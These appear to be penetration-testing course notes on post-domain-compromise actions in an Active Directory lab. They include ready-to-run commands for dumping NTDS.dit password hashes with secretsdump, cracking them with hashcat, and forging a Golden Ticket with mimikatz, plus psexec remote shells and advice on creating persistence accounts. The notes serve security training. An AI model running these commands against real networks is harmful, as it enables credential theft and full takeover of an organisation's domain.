
##   Post-Domain Compromise Attack Strategy
###### We own the Domain Now What?
- Provide as much value to the client as possible
	- Put your blinders on and do it again
	- Dump the NTDS.dit and crack passwords
	- Enumerate shares for sensitive information
- Persistence can be important
	- What happens if our DA access is lost?
	- Creating a DA account can be useful (DO NO FORGOT TO DELETE IT)
	- Creating a Golden Ticket can be useful, too.

##   Dumping the NTDS.dit
- What is it?
	- A database used to store AD data. This data includes:
		- User information
		- Group information
		- Security descriptors
		- password hashes
- `secretsdump.py MARVEL.local/hawkeye:'Password@1'@10.0.2.15 -just-dc-ntlm` -- it will dump ntds.dit of DA
- `hascat -m 1000 hashes.txt /path/to/rockyou.txt`

##   Golden Ticket Attacks 
- What is it?
	- When we compromise the krbtgt account, we own the domain
	- We can request access to any resource or system on the domain
	- Golden tickets == complete access to every machine
- To perform we need mimkatz.exe on windows (target system)
	- `mimikatz.exe`
	- `privilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
	- `lsadump::lsa /inject /name:krbtgt`
	- now from the output we need sid of domain, NTLM hash of krbtgt
	- `kerberos::golden /User:Administrator /domain:marvel.local /sid:[SID] /krbtgt:[NTLM] /id:500 /ptt`
	- `misc::cmd` -- this will open new cmd
		- `dir \\User-1\c$`
		- `psexec.exe \\User-1 cmd.exe`